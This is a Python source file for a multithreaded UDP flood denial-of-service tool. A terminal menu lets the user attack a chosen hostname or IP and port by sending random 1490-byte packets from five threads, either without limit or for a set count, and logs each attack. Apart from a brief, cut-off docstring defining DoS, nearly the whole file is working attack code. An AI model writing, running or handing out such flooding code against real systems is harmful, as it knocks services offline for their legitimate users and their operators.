"""
A DoS (Denial of Service) is a type of cyber attack in which a single computer or device overwhelms a server, system, or network 
by sending a large volume of malicious requests,
preventing legitimate users from accessing the service.
Unlike a DDoS (Distributed Denial of Service),
which uses multiple machines to amplify the attack, a DoS is simpler and can be more easily identified and blocked.
This attack can expand the scope of
"""
from colorama import Fore, init #color in terminal
import socket
import random
from urllib.parse import urlparse
import threading
import logging
# modules local
import modules.https
import modules.ip_atack
import modules.main

init(autoreset=True)

logging.basicConfig(
    filename='ataques.log', 
    level=logging.INFO, 
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def execute_attack(target, bytes, quantidade):
   
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # Creates a UDP socket using the IPv4 address family
    sent_packages = 0

    try:
        if quantidade == 0:
        
           
            print(Fore.YELLOW + "attacking indefinitely... press Ctrl+C to stop") # Print that it is in an infinite attack, sending packets to the server, and display how many packets have been sent.
            while True:
                sock.sendto(bytes, target)
                sent_packages += 1
                print(Fore.GREEN + f"pacote sent... total: {sent_packages}")
        else:
            
            for _ in range(quantidade): # "It sends packets just like the other one, but with a user-defined limit."
                sock.sendto(bytes, target)
                sent_packages += 1
                print(Fore.GREEN + f"package sent... total: {sent_packages}")  # prints the number of sent packets

    except KeyboardInterrupt:  # if you press CTRL + C, it stops
        print(Fore.CYAN + "attack interrupted by user")  # shows message when attack is stopped manually

    except Exception as e:  # if an error occurs, it prints the error
        print(Fore.RED + f"error during attack: {e}")  # shows the error message

    finally:
        sock.close()  # closes the socket
        logging.info(f"attack finished on target {target[0]}:{target[1]} with {sent_packages} packets sent.")  # logs attack result


def main(hostname, door, quantidade):
    """
    DDOS main function
      parameters:
            hostname(int)hostname or ip
            door(int)target port 
            quantidade(int)numbrer of packets
     return:
            none executes only the attack
    """
    if not hostname or not door:
        print(Fore.RED + "invalid entry closing...") #  if hostname or port is missing, show error and stop
        return

    try:
        ip = socket.gethostbyname(hostname)
        target = (ip, door)  # create target tuple with IP and port
        print(Fore.YELLOW + f"Initiating attack on target {target[0]}:{target[1]}")# display attack info
        bytes = random._urandom(1490) # generate random bytes to send in each packet
        
        
        threads = []  # list to store thread objects

        num_threads = 5  # define how many threads will run the attack

        for _ in range(num_threads):
            thread = threading.Thread(target=execute_attack, args=(target, bytes, quantidade))  # create attack thread
            threads.append(thread)  # add thread to the list

            thread.start()  # start the thread

        for thread in threads:
            thread.join()  # wait for all threads to finish

        print(Fore.CYAN + "attack completed")  # notify that the attack is done

    except socket.gaierror:  # if the hostname is invalid or can't be resolved

        print(Fore.RED + "Invalid hostname could not resolve IP")

    except Exception as e:  # catch any other general error

        print(Fore.RED + f"a general error has occurred: {e}")



def panel():
   """
    Function that displays a panel of options to the user.

    Allows the user to choose between different attack methods or exit the program.

    Returns:
    None. Only interacts with the user.
    """


   while True:
        try:
            option = int(input(Fore.CYAN + """
            ██████╗ ██████╗  ██████╗ ███████╗
            ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
            ██║  ██║██║  ██║██║   ██║███████╗
            ██║  ██║██║  ██║██║   ██║╚════██║
            ██████╔╝██████╔╝╚██████╔╝███████║
            ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
            [1] to attack with HTTPS
            [2] to attack with IP
            [0] quit
            Option: """))
            
            if option == 1: 
                hostname, door, quantidade = modules.https.https( modules.main.validar_porta, modules.main.validar_quantidade)
                main(hostname, door, quantidade)
            elif option == 2:
                ip, door, quantidade = modules.ip_atack.ip_attack( modules.main.validar_porta, modules.main.validar_quantidade)
                modules.main.main_ip(ip, door, quantidade, execute_attack)

            elif option == 0:
                print(Fore.CYAN + "leaving...")
                break
            else:
                print(Fore.RED + "invalid option try again")
        except ValueError:
            print(Fore.RED + "error: please enter a valid number")


panel()
